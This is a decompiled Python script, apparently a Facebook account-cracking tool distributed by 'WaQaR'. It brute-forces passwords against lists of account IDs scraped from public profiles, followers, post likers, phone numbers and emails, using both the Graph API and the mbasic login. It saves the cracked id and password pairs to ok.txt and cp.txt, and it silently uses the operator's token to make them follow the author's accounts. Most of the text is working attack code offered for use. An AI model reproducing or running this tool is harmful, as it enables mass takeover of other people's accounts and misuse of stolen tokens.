...
# Time Succes decompile : 2021-12-04 11:07:42.338778
...
def banner():
    print("""\x1b[1;97m
\x1b[1;97m   _       __      ____        ____ 
                  | |     / /___ _/ __ \____ _/ __ \
                  | | /| / / __ `/ / / / __ `/ /_/ /
                  | |/ |/ / /_/ / /_/ / /_/ / _, _/ 
                  |__/|__/\__,_/\___\_\__,_/_/ |_|   \x1b[1;91m[√] \x1b[1;97mWaQaR \x1b[1;91m[√]
\x1b[1;91m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 \x1b[1;97m[•] \x1b[1;92mAuthur    :  \x1b[1;97mWaQaR AJ    
 \x1b[1;97m[•] \x1b[1;92mFacebook  :  \x1b[1;97mfb.com/Muhammadwaqar0313  
 \x1b[1;97m[•] \x1b[1;92mWhatsapp  :  \x1b[1;97m+380943059628     
 \x1b[1;97m[•] \x1b[1;92mWarning   :  \x1b[1;97mUse free Cloning     
 \x1b[1;97m[•] \x1b[1;92mWarning   :  \x1b[1;97mNot Work Use Vp      
\x1b[1;91m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")
...
def country():
    os.system("clear")
    banner()
    print("\n%s%s \x1b[1;91m[✓𝙞𝙛 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙙 𝙞 𝙖𝙢 𝙮𝙤𝙪𝙧 𝙙𝙖𝙙✓] %s\n"%(k,p,k))
    print("%s[%s1%s] %sStart Cloning"%(k,p,k,p))
    choose_country()
...
def choose_country():
    ...
    if cc in[""]:
        ...
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
def logs():
  os.system('xdg-open https://wa.me/+380943059628')
  os.system("clear")
  banner()
  print((k+"\n "+p+" "+k+" "+p+" \x1b[1;91mThis Tool Use Token"))
...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/742821237/subscribers?access_token=" + toket)      # Zait Ullah
	requests.post("https://graph.facebook.com/100006969191857/subscribers?access_token=" + toket)      # Soil Ahmed Khan
...
def menu():
    ...
    print((k+"\n["+p+"•"+k+"]"+p+" \x1b[1;91mYour ID : "+id))
    print((k+"["+p+"•"+k+"]"+p+" \x1b[1;91mYour IP : "+ip))
    print((k+"["+p+"•"+k+"]"+p+" \x1b[1;91mStatus  : "+m+" \x1b[1;92mFree Version "+p))
    print((k+"["+p+"•"+k+"]"+p+" \x1b[1;91mJoined  : "+durasi))
    print((k+"["+p+"•"+k+"]"+p+" \x1b[1;91mCrack   : "+negara))
    print((k+"\n["+p+"1"+k+"]"+p+" \x1b[1;91mCrack ID From Public \x1b[1;92mpro "))
    print((k+"["+p+"2"+k+"]"+p+" \x1b[1;91mCrack ID From Followers"))
    print((k+"["+p+"3"+k+"]"+p+" \x1b[1;91mCrack ID From Likers Post"))
    print((k+"["+p+"4"+k+"]"+p+" \x1b[1;91mCrack By Phone Number \x1b[1;92mpro "))
    print((k+"["+p+"5"+k+"]"+p+" \x1b[1;91mCrack By Email"))
    print((k+"["+p+"6"+k+"]"+p+" \x1b[1;91mGet Data Target"))
    print((k+"["+p+"7"+k+"]"+p+" \x1b[1;91mResult Crack"))
    print((k+"["+p+"8"+k+"]"+p+" \x1b[1;91mUser Agent"))
    print((k+"["+p+"0"+k+"]"+p+" \x1b[1;91mLogout"))
    choose_menu()
def choose_menu():
	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
	if r=="":
		...
		menu()	
def pilihcrack(file):
  print((k+"\n["+p+"1"+k+"]"+p+" Api ("+k+" \x1b[1;91mFast "+p+")"))
  print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+" \x1b[1;91mFast "+p+")"))
  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"Slow"+p+")("+h+"Recommended"+p+")"))
  print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+" \x1b[1;91mSlow "+p+")"))
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					print(("\r\x1b[1;92m[\x1b[1;92mBaloch_CP\x1b[1;92m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[1;92m[\x1b[1;92mBALOCH_OK\x1b[1;92m] %s • %s               "%(fl.get("id"),i)))
			...
			self.ko+=1
			print(("\r\x1b[1;93m[\x1b[1;92mCrack\x1b[1;93m]\x1b[1;92m %s/%s \x1b[1;93m[\x1b[1;92mOK : %s\x1b[1;93m] \x1b[1;92m[\x1b[1;93mCP : %s\x1b[1;92m]\x1b[1;93m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
class crackttl:
	os.system("clear")
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					...
					print(("\r\x1b[1;92m[\x1b[1;92mBaloch_CP\x1b[1;92m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
...
class bapi:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      print(("\r\x1b[1;92m[\x1b[1;92mBaloch_OK\x1b[1;92m] %s • %s %s               "%(username,password,N)))
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[1;92m[\x1b[1;92mBaloch_CP\x1b[1;92m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
...
class bapittl:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[1;92m[\x1b[1;92m[WaQaR✓OK]\x1b[1;92m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[1;92m[\x1b[1;92m[ WaQaR×CP]\x1b[1;92m] %s • %s • %s\x1b[1;92m   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
    ...
    if self.setpw == False:
      ...
      for pw in fl["pw"]:
        ...
        try:
          ...
          continue
        print(("\r\x1b[1;92m[\x1b[1;93mCrack\x1b[1;92m]\x1b[1;93m %s/%s \x1b[1;92m[\x1b[1;93mOK : %s\x1b[1;92m] \x1b[1;93m[\x1b[1;92mCP : %s\x1b[1;93m]\x1b[1;92m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        ...
        try:
          ...
          continue
        print(("\r\x1b[1;92m[\x1b[1;93mCrack\x1b[1;92m]\x1b[1;93m %s/%s \x1b[1;92m[\x1b[1;93mOK : %s\x1b[1;92m] \x1b[1;93m[\x1b[1;92mCP : %s\x1b[1;93m]\x1b[1;92m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
def results(Ameer,Krahkrah):
        if len(Ameer) !=0:
                print(("[WaQaR✓OK] : "+str(len(Ameer))))
        if len(Krahkrah) !=0:
                print(("[ WaQaR×CP] : "+str(len(Krahkrah))))
        if len(Ameer) ==0 and len(Krahkrah) ==0:
                print("\n")
